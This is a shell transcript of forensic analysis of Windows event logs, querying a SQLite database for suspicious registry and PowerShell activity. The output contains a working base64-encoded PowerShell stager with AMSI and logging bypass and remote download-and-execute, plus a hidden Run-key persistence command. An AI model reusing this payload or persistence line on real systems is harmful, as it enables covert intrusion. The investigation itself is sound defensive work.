-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> import re
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> def log_query(title, query):
-[?2004l[?2004h>     print(f"\n{'='*20} {title} {'='*20}")
-[?2004l[?2004h>     cursor.execute(query)
-[?2004l[?2004h>     rows = cursor.fetchall()
-[?2004l[?2004h>     print(f"Returned {len(rows)} rows.")
-[?2004l[?2004h>     for r in rows[:100]: # limit to 100 on screen
-[?2004l[?2004h>         print(r)
-[?2004l[?2004h> 
-[?2004l[?2004h> # Unique users
-[?2004l[?2004h> log_query("Users count", "SELECT user, COUNT(*) FROM events GROUP BY user ORDER BY 2 DESC")
-[?2004l[?2004h> # Unique images
-[?2004l[?2004h> log_query("Images count", "SELECT image, COUNT(*) FROM events GROUP BY image ORDER BY 2 DESC")
-[?2004l[?2004h> # Unique target_objects (Registry)
-[?2004l[?2004h> log_query("Registry Target Objects", "SELECT target_object, COUNT(*) FROM events WHERE target_object IS NOT NULL AND target_object != '' GROUP BY target_object ORDER BY 2 DESC")
-[?2004l[?2004h> # Unique process_guids
-[?2004l[?2004h> log_query("Process GUIDs", "SELECT process_guid, image, COUNT(*) FROM events WHERE process_guid IS NOT NULL GROUP BY process_guid, image ORDER BY 3 DESC")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/baseline_to_file.py > /tmp/baseline_res.txt
-[?2004l[?2004hroot@330dbb2b3463:~# head -n 100 /tmp/baseline_res.txt
-[?2004l
-==================== Users count ====================
-Returned 8 rows.
-('', 455)
-('pgustavo', 129)
-('NT AUTHORITY\\NETWORK SERVICE', 21)
-('NT AUTHORITY\\SYSTEM', 15)
-('WEC$', 13)
-('CORP\\pgustavo', 10)
-('-', 8)
-('DC01$', 6)
-
-==================== Images count ====================
-Returned 11 rows.
-('', 528)
-('C:\\windows\\system32\\svchost.exe', 40)
-('C:\\Windows\\System32\\svchost.exe', 31)
-('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 23)
-('C:\\Windows\\System32\\lsass.exe', 10)
-('C:\\windows\\System32\\svchost.exe', 9)
-('System', 5)
-('C:\\Windows\\System32\\dns.exe', 5)
-('C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', 3)
-('C:\\windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe', 2)
-('C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe', 1)
-
-==================== Registry Target Objects ====================
-Returned 9 rows.
-('HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections', 11)
-('HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime', 9)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections', 3)
-('HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters', 2)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VFUProvider\\StartTime', 2)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VFUProvider', 2)
-('HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad', 1)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater', 1)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug', 1)
-
-==================== Process GUIDs ====================
-Returned 29 rows.
-('{b59756a9-b239-5f17-5307-000000000400}', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 23)
-('{47b21e2e-99b3-5f14-3303-000000000400}', 'C:\\Windows\\System32\\svchost.exe', 19)
-('{03255e25-9966-5f14-1200-000000000400}', 'C:\\windows\\system32\\svchost.exe', 13)
-('{b59756a9-9966-5f14-1200-000000000400}', 'C:\\windows\\system32\\svchost.exe', 13)
-('{47b21e2e-9523-5f14-0c00-000000000400}', 'C:\\Windows\\System32\\lsass.exe', 10)
-('{47b21e2e-951a-5f14-0100-000000000400}', 'System', 5)
-('{47b21e2e-9538-5f14-4d00-000000000400}', 'C:\\Windows\\System32\\dns.exe', 5)
-('{47b21e2e-95b6-5f14-aa00-000000000400}', 'C:\\Windows\\System32\\svchost.exe', 4)
-('{b59756a9-9969-5f14-2d00-000000000400}', 'C:\\windows\\system32\\svchost.exe', 4)
-('{03255e25-996e-5f14-4900-000000000400}', 'C:\\windows\\system32\\svchost.exe', 3)
-('{03255e25-99c7-5f14-4802-000000000400}', 'C:\\Windows\\System32\\svchost.exe', 3)
-('{47b21e2e-9538-5f14-5200-000000000400}', 'C:\\windows\\system32\\svchost.exe', 3)
-('{b59756a9-996d-5f14-4900-000000000400}', 'C:\\windows\\system32\\svchost.exe', 3)
-('{b59756a9-99c5-5f14-4a02-000000000400}', 'C:\\Windows\\System32\\svchost.exe', 3)
-('{03255e25-996e-5f14-4700-000000000400}', 'C:\\windows\\System32\\svchost.exe', 2)
-('{47b21e2e-9538-5f14-4a00-000000000400}', 'C:\\windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe', 2)
-('{b59756a9-996d-5f14-4700-000000000400}', 'C:\\windows\\System32\\svchost.exe', 2)
-('{03255e25-9968-5f14-2700-000000000400}', 'C:\\windows\\System32\\svchost.exe', 1)
-('{03255e25-99c7-5f14-4802-000000000400}', 'C:\\windows\\System32\\svchost.exe', 1)
-('{47b21e2e-952c-5f14-0f00-000000000400}', 'C:\\Windows\\System32\\svchost.exe', 1)
-('{47b21e2e-952d-5f14-2100-000000000400}', 'C:\\Windows\\System32\\svchost.exe', 1)
-('{47b21e2e-952f-5f14-3000-000000000400}', 'C:\\windows\\system32\\svchost.exe', 1)
-('{47b21e2e-9538-5f14-4a00-000000000400}', 'C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe', 1)
-('{47b21e2e-99b3-5f14-3303-000000000400}', 'C:\\windows\\System32\\svchost.exe', 1)
-('{47b21e2e-bdd7-5f17-c408-000000000400}', 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', 1)
-('{47b21e2e-bdda-5f17-c508-000000000400}', 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', 1)
-('{47b21e2e-bddb-5f17-c608-000000000400}', 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', 1)
-('{b59756a9-9968-5f14-1e00-000000000400}', 'C:\\windows\\System32\\svchost.exe', 1)
-('{b59756a9-99c5-5f14-4a02-000000000400}', 'C:\\windows\\System32\\svchost.exe', 1)
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/search_reg.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, host, user, image, target_object, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE target_object LIKE '%Updater%' 
-[?2004l[?2004h>        OR target_object LIKE '%Debug%' 
-[?2004l[?2004h>        OR target_object LIKE '%VFUProvider%' 
-[?2004l[?2004h>        OR details LIKE '%Updater%' 
-[?2004l[?2004h>        OR details LIKE '%Debug%' 
-[?2004l[?2004h>        OR details LIKE '%VFUProvider%'
-[?2004l[?2004h> """)
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print("="*50)
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Host: {r[2]} | User: {r[3]} | Image: {r[4]}")
-[?2004l[?2004h>     print(f"TargetObj: {r[5]}")
-[?2004l[?2004h>     print(f"Details: {r[6]}")
-[?2004l[?2004h>     print(f"Message: {r[7][:200]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/search_reg.py
-[?2004l==================================================
-ID: evt-00223 | Code: 12 | Host: WS-05.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider
-Details: 
-Message: Registry object added or deleted:
-RuleName: -
-EventType: CreateKey
-UtcTime: 2020-07-22 04:19:00.008
-ProcessGuid: {b59756a9-996d-5f14-4700-000000000400}
-ProcessId: 3284
-Image: C:\windows\System32
-==================================================
-ID: evt-00224 | Code: 12 | Host: WS-06.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider
-Details: 
-Message: Registry object added or deleted:
-RuleName: -
-EventType: CreateKey
-UtcTime: 2020-07-22 04:19:00.001
-ProcessGuid: {03255e25-996e-5f14-4700-000000000400}
-ProcessId: 3232
-Image: C:\windows\System32
-==================================================
-ID: evt-00225 | Code: 13 | Host: WS-05.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime
-Details: QWORD (0x01d65fdf-0x39716c65)
-Message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:00.008
-ProcessGuid: {b59756a9-996d-5f14-4700-000000000400}
-ProcessId: 3284
-Image: C:\windows\System32\svchost.exe
-T
-==================================================
-ID: evt-00226 | Code: 13 | Host: WS-06.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime
-Details: QWORD (0x01d65fdf-0x39703e82)
-Message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:00.001
-ProcessGuid: {03255e25-996e-5f14-4700-000000000400}
-ProcessId: 3232
-Image: C:\windows\System32\svchost.exe
-T
-==================================================
-ID: evt-00286 | Code: 13 | Host: WS-05.corp.example | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Debug
-Details: SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAQQBsAH0ARQBsAHMAZQB7AFsAUwBDAFIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AGUAKAAkAG4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAE8ATABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAHMASABTAGUAVABbAFMAVAByAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBsAGwALAAkAFQAUgB1AEUAKQA7AH0AOwBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBTAEUAUgBWAGkAQwBlAFAATwBJAE4AdABNAGEATgBBAEcAZQBSAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAEEAOQA0ADgANgA9AE4ARQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAcwBUAGUAbQAuAE4ARQBUAC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AQwBPAGQASQBuAEcAXQA6ADoAVQBOAEkAYwBvAGQAZQAuAEcAZQB0AFMAVAByAGkAbgBnACgAWwBDAG8ATgBWAEUAUgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABhADkANAA4ADYALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkAPQBbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBXAEUAYgBSAEUAUQB1AEUAcwBUAF0AOgA6AEQARQBmAGEAdQBsAHQAVwBFAGIAUAByAG8AWABZADsAJABhADkANAA4ADYALgBQAHIATwBYAHkALgBDAHIARQBEAEUAbgBUAEkAYQBsAFMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABFAE4AdABJAGEAbABDAGEAQwBoAEUAXQA6ADoARABFAGYAYQBVAEwAdABOAEUAVABXAG8AUgBrAEMAcgBlAEQAZQBuAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQARQBNAC4AVABFAHgAVAAuAEUAbgBDAG8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAVABFAFMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGEAOQA0ADgANgAuAEgAZQBBAGQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AE8AdgBQAHYAYgB5AG0AZAAwAGIAVgBnAE0AUABxADQAZQA4AGIANABVAEcAMwBXAEsAbQBNAD0AIgApADsAJABkAEEAVABBAD0AJABBADkANAA4ADYALgBEAG8AdwBuAEwATwBBAGQARABBAFQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
-Message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:04.103
-ProcessGuid: {b59756a9-b239-5f17-5307-000000000400}
-ProcessId: 9076
-Image: C:\Windows\System32\WindowsPowerSh
-==================================================
-ID: evt-00289 | Code: 13 | Host: WS-05.corp.example | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater
-Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
-Message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:04.118
-ProcessGuid: {b59756a9-b239-5f17-5307-000000000400}
-ProcessId: 9076
-Image: C:\Windows\System32\WindowsPowerSh
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/search_vfu.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, host, user, image, target_object, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE target_object LIKE '%VFUProvider%' 
-[?2004l[?2004h>        OR details LIKE '%VFUProvider%'
-[?2004l[?2004h> """)
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print("="*50)
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Host: {r[2]} | User: {r[3]} | Image: {r[4]}")
-[?2004l[?2004h>     print(f"TargetObj: {r[5]}")
-[?2004l[?2004h>     print(f"Details: {r[6]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/search_vfu.py
-[?2004l==================================================
-ID: evt-00223 | Code: 12 | Host: WS-05.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider
-Details: 
-==================================================
-ID: evt-00224 | Code: 12 | Host: WS-06.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider
-Details: 
-==================================================
-ID: evt-00225 | Code: 13 | Host: WS-05.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime
-Details: QWORD (0x01d65fdf-0x39716c65)
-==================================================
-ID: evt-00226 | Code: 13 | Host: WS-06.corp.example | User:  | Image: C:\windows\System32\svchost.exe
-TargetObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime
-Details: QWORD (0x01d65fdf-0x39703e82)
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/analyze_ps.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> import re
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, host, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE event_code IN (800, 4103)
-[?2004l[?2004h> """)
-[?2004l[?2004h> ps_events = cursor.fetchall()
-[?2004l[?2004h> print(f"Total PowerShell events: {len(ps_events)}")
-[?2004l[?2004h> 
-[?2004l[?2004h> sessions = {}
-[?2004l[?2004h> for r in ps_events:
-[?2004l[?2004h>     eid, ec, host, msg = r
-[?2004l[?2004h>     if not msg:
-[?2004l[?2004h>         continue
-[?2004l[?2004h>     # extract Host ID or HostId
-[?2004l[?2004h>     host_id_match = re.search(r'Host\s*ID\s*=\s*([a-fA-F0-9-]+)', msg, re.IGNORECASE) or re.search(r'HostId=([a-fA-F0-9-]+)', msg, re.IGNORECASE)
-[?2004l[?2004h>     host_id = host_id_match.group(1) if host_id_match else "unknown"
-[?2004l[?2004h>     
-[?2004l[?2004h>     # extract UserId or User
-[?2004l[?2004h>     user_match = re.search(r'UserId=([^\s\n]+)', msg, re.IGNORECASE) or re.search(r'User\s*=\s*([^\s\n]+)', msg, re.IGNORECASE)
-[?2004l[?2004h>     user = user_match.group(1) if user_match else "unknown"
-[?2004l[?2004h>     
-[?2004l[?2004h>     sessions.setdefault(host_id, []).append((eid, ec, host, user))
-[?2004l[?2004h> 
-[?2004l[?2004h> print(f"Found {len(sessions)} unique PowerShell Host/Session IDs:")
-[?2004l[?2004h> for hid, evs in sessions.items():
-[?2004l[?2004h>     print(f"Host ID: {hid} | Event Count: {len(evs)} | Sample Host: {evs[0][2]} | Sample User: {evs[0][3]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/analyze_ps.py
-[?2004lTotal PowerShell events: 135
-Found 2 unique PowerShell Host/Session IDs:
-Host ID: ca33ee8b-7d2f-4343-83bb-33cd9ad23223 | Event Count: 133 | Sample Host: WS-05.corp.example | Sample User: CORP\pgustavo
-Host ID: unknown | Event Count: 2 | Sample Host: WS-05.corp.example | Sample User: unknown
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT event_id, event_code, host, message FROM events WHERE event_code IN (800, 4103) AND event_id NOT IN (SELECT event_id FROM events WHERE event_code IN (800, 4103) AND (message LIKE '%ca33ee8b-7d2f-4343-83bb-33cd9ad23223%'));"
-[?2004levt-00256|4103|WS-05.corp.example|CommandInvocation(Set-ItemProperty): "Set-ItemProperty"
-ParameterBinding(Set-ItemProperty): name="Force"; value="True"
-ParameterBinding(Set-ItemProperty): name="Path"; value="HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion"
-ParameterBinding(Set-ItemProperty): name="Name"; value="Debug"
-ParameterBinding(Set-ItemProperty): name="Value"; value="SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTA
-evt-00260|4103|WS-05.corp.example|CommandInvocation(Invoke-Expression): "Invoke-Expression"
